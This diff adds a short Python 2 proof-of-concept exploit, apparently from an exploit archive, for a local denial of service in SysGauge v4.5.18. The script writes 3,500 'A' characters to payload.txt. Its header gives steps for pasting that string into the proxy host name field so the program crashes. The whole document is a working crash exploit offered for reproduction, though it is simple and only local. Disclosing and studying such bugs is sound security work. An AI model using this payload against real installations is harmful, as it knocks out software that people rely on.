@@ -1,0 +1,24 @@
+#!/usr/bin/python
+############################################################################################
+# Exploit Title       : SysGauge v4.5.18 - Local Denial of Service                         #
+# Exploit Author      : Hashim Jawad                                                       #
+# Twitter             : @ihack4falafel                                                     # 
+# Author Website      : ihack4falafel[.]com                                                #
+# Vendor Homepage     : http://www.sysgauge.com/                                           #
+# Vulnerable Software : http://www.sysgauge.com/setups/sysgauge_setup_v4.5.18.exe          #
+# Note                : SysGauge Pro and Ultimate v4.5.18 are also vulnerable              #
+# Steps to Reproduce  : ~ Copy content of payload.txt                                      # 
+#                       ~ Select Manual proxy configuration under Options->Proxy           #
+#                       ~ Paste content in 'Proxy Server Host Name' field and click Save   #
+############################################################################################
+
+buffer = "A" * 3500
+
+try:
+    f=open("payload.txt","w")
+    print "[+] Creating %s bytes evil payload.." %len(buffer)
+    f.write(buffer)
+    f.close()
+    print "[+] File created!"
+except:
+    print "File cannot be created"
